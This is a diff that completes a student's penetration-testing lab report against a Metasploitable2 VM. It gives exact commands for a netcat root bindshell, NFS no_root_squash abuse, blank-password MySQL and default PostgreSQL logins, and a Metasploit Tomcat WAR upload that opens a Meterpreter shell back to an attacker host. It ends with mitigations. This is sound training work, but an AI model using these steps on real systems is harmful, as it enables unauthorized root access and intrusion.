@@ -170,103 +170,145 @@ Key findings (65505 closed, notable open ports):
 
 ## Exploit 6: the "ingreslock" root blindshell (port 1524)
 
-- **Service / Port:** <e.g. FTP / 21>
-- **Vulnerability:** <name/CVE if known>
-- **Tool Used:** <e.g. Metasploit — exploit/unix/ftp/vsftpd_234_backdoor>
-- **Why This Tool:** <Why this was the right tool/module for this specific vulnerability —
-  not a generic "Metasploit is good for exploits" answer.>
+- **Service / Port:** ingreslock / 1524
+- **Vulnerability:** Pre-planted root shell backdoor baked into the Metasploitable2 image itself — a leftover unauthenticated listener, not a real-world CVE
+- **Tool Used:** Manual — `nc` (netcat)
+- **Why This Tool:** No exploitation is actually required — the port already has a live root shell bound to it; a Metasploit exploit module would be inappropriate since no vulnerability is being triggered, just a direct connection
 - **Steps:**
-  1. <exact command/action>
-  2. <exact command/action>
-  3. <...>
-- **Evidence:** <path to screenshot, e.g. evidence/exploit1.png>
-- **Cyber Kill Chain Stage(s):** <e.g. Reconnaissance, Weaponization, Exploitation, Installation, C2>
-  - <one or two sentences justifying WHY each stage you listed applies to this specific exploit>
-- **Outcome / Impact:** <What access/data/privilege you actually got>
+    1. `nc 192.168.1.4 1524`
+    2. Landed directly at `root@metasploitable:/#` prompt
+    3. `whoami` → confirmed `root`
+- **Evidence:** evidence/exploit6.png
+- **Cyber Kill Chain Stage(s):** Reconnaissance, Delivery, Installation, C2
+    - Reconnaissance: nmap flagged the "Metasploitable root shell" service label on 1524.
+    - Delivery: netcat connection made to the open port.
+    - Installation/C2: interactive root shell obtained directly — no Weaponization or Exploitation stage applies since no vulnerability was triggered, just a connection to a pre-existing backdoor.
+- **Outcome / Impact:** Immediate, unauthenticated root shell access
+
+
 
   ## Exploit 7: NFS no_root_squash Misconfiguration(port 2049)
-
-- **Service / Port:** <e.g. FTP / 21>
-- **Vulnerability:** <name/CVE if known>
-- **Tool Used:** <e.g. Metasploit — exploit/unix/ftp/vsftpd_234_backdoor>
-- **Why This Tool:** <Why this was the right tool/module for this specific vulnerability —
-  not a generic "Metasploit is good for exploits" answer.>
+- **Service / Port:** NFS / 2049
+- **Vulnerability:** NFS export misconfigured with `no_root_squash`, exporting `/` to any client (`*`) — allows a remote root user to write files to the target filesystem as root instead of being mapped to an unprivileged user
+- **Tool Used:** Manual — `showmount`, `mount`, standard filesystem commands
+- **Why This Tool:** This is a configuration flaw, not a code vulnerability — standard NFS client tools are sufficient to mount the share and demonstrate root-owned file creation
 - **Steps:**
-  1. <exact command/action>
-  2. <exact command/action>
-  3. <...>
-- **Evidence:** <path to screenshot, e.g. evidence/exploit1.png>
-- **Cyber Kill Chain Stage(s):** <e.g. Reconnaissance, Weaponization, Exploitation, Installation, C2>
-  - <one or two sentences justifying WHY each stage you listed applies to this specific exploit>
-- **Outcome / Impact:** <What access/data/privilege you actually got>
+    1. `showmount -e 192.168.1.4` → confirmed `/` exported to `*` (unrestricted)
+    2. `mkdir /tmp/nfs_mount`
+    3. `sudo mount -t nfs 192.168.1.4:/ /tmp/nfs_mount -o nolock`
+    4. `ls -la /tmp/nfs_mount` → confirmed mount succeeded, full target filesystem visible
+    5. `touch /tmp/nfs_mount/pwned_test` → failed with Permission denied (top-level `/` not world-writable)
+    6. `sudo touch /tmp/nfs_mount/tmp/pwned_test` → created as local root, using the target's world-writable `/tmp`
+    7. `ls -la /tmp/nfs_mount/tmp/pwned_test` → confirmed file owned by `root root` on the remote system
+- **Evidence:** evidence/exploit7.png
+- **Cyber Kill Chain Stage(s):** Reconnaissance, Weaponization, Delivery, Exploitation, Actions on Objectives
+    - Reconnaissance: nmap identified NFS/rpcbind and showmount revealed the unrestricted export.
+    - Weaponization/Delivery: mounting the misconfigured share as a local filesystem.
+    - Exploitation: writing a root-owned file, demonstrating unauthorized privileged filesystem access.
+    -
+ Actions on Objectives: arbitrary read/write access to the entire target filesystem as root.
+- **Outcome / Impact:** Arbitrary root-level read/write access to the target's entire filesystem via NFS
+
 
 ## Exploit 8: MySQL root with no password (port 3306)
-
-- **Service / Port:** <e.g. FTP / 21>
-- **Vulnerability:** <name/CVE if known>
-- **Tool Used:** <e.g. Metasploit — exploit/unix/ftp/vsftpd_234_backdoor>
-- **Why This Tool:** <Why this was the right tool/module for this specific vulnerability —
-  not a generic "Metasploit is good for exploits" answer.>
+- **Service / Port:** MySQL / 3306
+- **Vulnerability:** MySQL configured with a blank/empty root password, allowing unauthenticated root-level database access from any host
+- **Tool Used:** Manual — `mysql` CLI client
+- **Why This Tool:** This is a credential misconfiguration, not a code-level vulnerability — the standard database client connecting with the (blank) default root credentials is sufficient
 - **Steps:**
-  1. <exact command/action>
-  2. <exact command/action>
-  3. <...>
-- **Evidence:** <path to screenshot, e.g. evidence/exploit1.png>
-- **Cyber Kill Chain Stage(s):** <e.g. Reconnaissance, Weaponization, Exploitation, Installation, C2>
-  - <one or two sentences justifying WHY each stage you listed applies to this specific exploit>
-- **Outcome / Impact:** <What access/data/privilege you actually got>
+    1. `mysql -h 192.168.1.4 -u root` → failed with a TLS/SSL negotiation error (modern client defaults vs. ancient server)
+    2. `mysql -h 192.168.1.4 -u root --skip-ssl` → connected successfully with no password prompt
+    3. `SELECT version();` → confirmed `5.0.51a-3ubuntu5`
+    4. `SELECT user, host FROM mysql.user;` → enumerated accounts (debian-sys-maint, guest, root — root accessible from host `%`, i.e. any host)
+- **Evidence:** evidence/exploit8.png
+- **Cyber Kill Chain Stage(s):** 
+    - Reconnaissance: nmap identified MySQL 5.0.51a-3ubuntu5 on 3306.
+    -  Delivery: direct authentication attempt with blank root password.
+    -  Exploitation: server accepted unauthenticated root login.
+    
+Actions on Objectives: enumerated the full user table, confirming access to read/modify all databases.
+- **Outcome / Impact:** Full unauthenticated root access to the MySQL database server
+
 
 
   ## Exploit 9: PostgreSQL default credentials (pot 5432)
-
-- **Service / Port:** <e.g. FTP / 21>
-- **Vulnerability:** <name/CVE if known>
-- **Tool Used:** <e.g. Metasploit — exploit/unix/ftp/vsftpd_234_backdoor>
-- **Why This Tool:** <Why this was the right tool/module for this specific vulnerability —
-  not a generic "Metasploit is good for exploits" answer.>
+  
+- **Service / Port:** PostgreSQL / 5432
+- 
+- **Vulnerability:** PostgreSQL configured with the default/weak credential pair (postgres/postgres) for the superuser account.
+- 
+- **Tool Used:** Manual — psql CLI client.
+- 
+- **Why This Tool:** This is a credential weakness, not a code vulnerability — connecting with the well-known default password directly demonstrates the flaw.
+- 
 - **Steps:**
-  1. <exact command/action>
-  2. <exact command/action>
-  3. <...>
-- **Evidence:** <path to screenshot, e.g. evidence/exploit1.png>
-- **Cyber Kill Chain Stage(s):** <e.g. Reconnaissance, Weaponization, Exploitation, Installation, C2>
-  - <one or two sentences justifying WHY each stage you listed applies to this specific exploit>
-- **Outcome / Impact:** <What access/data/privilege you actually got>
+    1. psql -h 192.168.1.4 -U postgres
+    2. Entered postgres at the password prompt
+    3. Connected successfully to postgres=# prompt (server 8.3.1)
+    4. SELECT version(); → confirmed PostgreSQL 8.3.1
+    5. `SELECT usename, usesuper FROM pg_user WHERE usename = current_user; → confirmed `usesuper = t` (superuser)
+- **Evidence:** evidence/exploit9.png
+- **Cyber Kill Chain Stage(s):** 
+    - Reconnaissance: nmap identified PostgreSQL DB 8.3.0-8.3.7 on 5432. Delivery: authentication attempt with default credentials.
+    -  Exploitation: server accepted the weak default password. Actions on Objectives: confirmed superuser access, enabling full database read/write and potential OS-level command execution.
+- **Outcome / Impact:** Full superuser access to the PostgreSQL database server
+
 
 ## Exploit 10: Tomcat manager default credentials - WAR shell upload (port 8180)
 
-- **Service / Port:** <e.g. FTP / 21>
-- **Vulnerability:** <name/CVE if known>
-- **Tool Used:** <e.g. Metasploit — exploit/unix/ftp/vsftpd_234_backdoor>
-- **Why This Tool:** <Why this was the right tool/module for this specific vulnerability —
-  not a generic "Metasploit is good for exploits" answer.>
+- **Service / Port:** HTTP(Tomcat Manager)/8180
+- 
+- **Vulnerability:** Apache Tomcat Manager left with default credentials (tomcat/tomcat), allowing an authenticated user to deploy arbitrary WAR files containing Java code for remote code execution.
+- 
+- **Tool Used:**  Metasploit — exploit/multi/http/tomcat_mgr_upload.
+- 
+- **Why This Tool:** Manual exploitation requires packaging a valid WAR containing a JSP shell, handling session/CSRF tokens, authenticating, uploading via the manager's HTTP API, then triggering deployment — Metasploit automates the entire pipeline.
+- 
 - **Steps:**
-  1. <exact command/action>
-  2. <exact command/action>
-  3. <...>
-- **Evidence:** <path to screenshot, e.g. evidence/exploit1.png>
-- **Cyber Kill Chain Stage(s):** <e.g. Reconnaissance, Weaponization, Exploitation, Installation, C2>
-  - <one or two sentences justifying WHY each stage you listed applies to this specific exploit>
-- **Outcome / Impact:** <What access/data/privilege you actually got>
-
-
-
-
-
+  1. search tomcat_mgr
+  2. use exploit/multi/http/tomcat_mgr_upload (defaulted to Java Meterpreter payload)
+  3. set RHOSTS 192.168.1.4
+  4. set RPORT 8180
+  5. set HttpUsername tomcat
+  6. set HttpPassword tomcat
+  7. set LHOST 192.168.1.3
+  8. exploit - retrieved session ID/CSRF token, uploaded and deployed a malicious WAR, executed it, auto-undeployed as cleanup, Meterpreter session opened
+  9. getuid - confirmed (Server username: tomcat55)
   
+- **Evidence:** evidence/exploit10.png
+  
+- **Cyber Kill Chain Stage(s):** Reconnaissance - nmap identified Apache Tomcat/Coyote JSP engine on 8180.
+-  Weaponization - malicious WAR payload crafted.
+-  Delivery - authenticated upload via Tomcat Manager's HTTP interface.
+-  Exploitation -  WAR deployed and executed by the servlet container.
+-  Installation, C2 - Meterpreter session established.
+
+ **Outcome / Impact:** Remote code execution and interactive shell access via the web application server (as the tomcat55 service account)
+
+
 
 ## Kill Chain Coverage Summary
 
 | Exploit | Recon | Weaponization | Delivery | Exploitation | Installation | C2 | Actions on Objectives |
 |---|---|---|---|---|---|---|---|
-| 1. <title> | ✔ | ✔ | ✔ | ✔ | | | |
-| 2. <title> | | | | | | | |
-| ... | | | | | | | |
-| 10. <title> | | | | | | | |
+1. vsftpd 2.3.4 Backdoor | ✔ | ✔ | ✔ | ✔ | ✔ | ✔ | |
+| 2. UnrealIRCd 3.2.8.1 Backdoor | ✔ | ✔ | ✔ | ✔ | ✔ | ✔ | |
+| 3. Samba usermap_script RCE | ✔ | ✔ | ✔ | ✔ | ✔ | ✔ | |
+| 4. distccd Command Execution | ✔ | ✔ | ✔ | ✔ | ✔ | ✔ | |
+| 5. Java RMI Registry RCE | ✔ | ✔ | ✔ | ✔ | ✔ | ✔ | |
+| 6. "ingreslock" Root Bindshell | ✔ | | ✔ | | ✔ | ✔ | |
+| 7. NFS no_root_squash | ✔ | ✔ | ✔ | ✔ | | | ✔ |
+| 8. MySQL Root, No Password | ✔ | | ✔ | ✔ | | | ✔ |
+| 9. PostgreSQL Default Creds | ✔ | | ✔ | ✔ | | | ✔ |
+| 10. Tomcat Manager to WAR Shell | ✔ | ✔ | ✔ | ✔ | ✔ | ✔ | |
+
 
 ---
 
 ## Lessons Learned / Mitigations (optional but recommended)
 
-<For at least 2–3 of your exploits, what would actually fix the vulnerability
-(patch, config change, disabling a service, etc.)?>
+- **vsftpd backdoor / UnrealIRCd backdoor:** Never download binaries or source from unverified mirrors; verify checksums/signatures against the official project before installation.
+- **Samba usermap_script:** Patch to Samba >= 3.0.25rc4, or disable the `username map script` option unless strictly required.
+- **distccd:** Never expose distccd to untrusted networks; bind it to localhost/internal build farms only, behind a firewall.
+
+- **MySQL / PostgreSQL / Tomcat default credentials:** Change all default passwords immediately after installation; enforce strong password policies and disable remote root/superuser login where not required.
